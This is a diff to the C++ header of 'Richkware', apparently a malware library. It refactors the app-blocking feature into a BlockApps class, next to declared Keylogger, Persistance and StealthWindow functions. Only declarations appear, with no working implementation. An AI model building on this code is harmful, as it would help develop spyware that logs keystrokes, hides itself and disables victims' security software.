@@ -31,11 +31,12 @@
 #include <map>
 
 #include "crypto.h"
+#include "sharedList.h"
 #include "thread.h"
+#include "blockapps.h"
 
 class Richkware {
 private:
-	HANDLE hBlockAppsTh;
 	std::map<std::string, std::string> session;
 	std::string AppName;
 
@@ -48,8 +49,8 @@ private:
 	void LoadSession(const char* EncryptionKey);
 	
 public:
-	std::list<const char*> dangerousApps;
 	const char* EncryptionKey;
+	BlockApps blockApps;
 
 	void SaveInfo(const char* key, const char* value);
 	std::string FindInfo(const char* key);
@@ -60,8 +61,6 @@ public:
 	void Persistance();
 	void StealthWindow(const char* window);
 	void OpenApp(const char* app);
-	void BlockApps();
-	void UnBlockApps();
 	void Keylogger(const char* fileName);
 	bool CheckSession();
 	bool CheckPersistance();
